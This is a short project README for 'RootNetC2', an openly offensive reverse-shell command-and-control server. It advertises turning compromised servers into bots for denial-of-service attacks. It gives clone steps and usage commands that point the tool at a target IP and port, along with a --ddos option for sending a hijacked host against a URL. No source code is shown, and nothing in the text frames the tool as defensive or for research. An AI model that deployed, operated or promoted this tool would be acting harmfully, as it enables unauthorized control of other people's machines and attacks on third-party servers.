
# RootNetC2

RootNetC2 Is a reverse shell Command and control Server.
And using the Compromissed server as a bot to DDoS Servers.





## Deployment

To deploy this project run

```bash
  git clone https://github.com/kryptonx2/RootNetC2.git
  cd Downloads/or the directory you have the file
  python3 c2.py -h
```


## Usage/Examples

```
python3 c2.py --target 187.200.54.181 --port 80 --localhost 127.0.0.1 --lp 80

## To Send the Compromissed Server to DDoS use

python3 c2.py --target 187.200.54.181 --port 80 --localhost 127.0.0.1 --lp 80 --ddos <url>
```


## License

[MIT](https://choosealicense.com/licenses/mit/)


## Features

- Easy to Use
- Multi Plataform [linux, MacOS, Windows]
- Base64 Encrypted Request's



## Authors

- [@rootkitcybersec](https://github.com/kryptonx2)

